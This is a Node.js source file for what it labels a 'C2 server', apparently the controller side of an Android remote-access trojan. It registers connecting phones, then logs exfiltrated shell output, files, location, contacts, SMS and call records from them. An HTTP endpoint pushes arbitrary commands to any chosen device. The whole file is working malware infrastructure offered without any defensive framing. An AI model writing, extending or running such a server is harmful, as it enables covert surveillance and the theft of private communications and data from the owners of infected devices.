const http = require('http');
const { Server } = require('socket.io');

const httpServer = http.createServer();
const io = new Server(httpServer, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const clients = new Map();

io.on('connection', (socket) => {
  console.log(`Client connected: ${socket.id}`);
  console.log(`Query params: ${JSON.stringify(socket.handshake.query)}`);
  
  const deviceInfo = {
    id: socket.id,
    model: socket.handshake.query.model || 'Unknown',
    manufacturer: socket.handshake.query.manf || 'Unknown',
    release: socket.handshake.query.release || 'Unknown',
    deviceID: socket.handshake.query.id || socket.id,
    connectedAt: new Date().toISOString()
  };
  
  clients.set(socket.id, { socket, info: deviceInfo });
  
  console.log(`Device registered: ${deviceInfo.model} (${deviceInfo.manufacturer})`);
  
  socket.emit('welcome', { 
    message: 'Connected to C2 server',
    serverTime: new Date().toISOString()
  });
  
  socket.on('disconnect', () => {
    console.log(`Client disconnected: ${socket.id}`);
    clients.delete(socket.id);
  });
  
  socket.on('data', (data) => {
    console.log(`Data from ${socket.id}:`, data);
  });
  
  socket.on('shell', (data) => {
    console.log(`Shell output from ${socket.id}:`, data);
  });
  
  socket.on('file', (data) => {
    console.log(`File from ${socket.id}:`, data);
  });
  
  socket.on('location', (data) => {
    console.log(`Location from ${socket.id}:`, data);
  });
  
  socket.on('contacts', (data) => {
    console.log(`Contacts from ${socket.id}:`, data);
  });
  
  socket.on('sms', (data) => {
    console.log(`SMS from ${socket.id}:`, data);
  });
  
  socket.on('calls', (data) => {
    console.log(`Calls from ${socket.id}:`, data);
  });
});

const httpServerCmd = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/command') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const { clientId, command, args } = JSON.parse(body);
        const client = clients.get(clientId);
        if (client) {
          client.socket.emit('command', { command, args });
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: true }));
        } else {
          res.writeHead(404, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'Client not found' }));
        }
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Invalid JSON' }));
      }
    });
  } else if (req.method === 'GET' && req.url === '/clients') {
    const clientList = Array.from(clients.entries()).map(([id, data]) => ({
      id,
      ...data.info
    }));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ clients: clientList }));
  } else {
    res.writeHead(404);
    res.end();
  }
});

io.listen(42474);
httpServerCmd.listen(42475);

console.log('Socket.IO server listening on port 42474');
console.log('Command HTTP server listening on port 42475');
console.log('Waiting for connections...');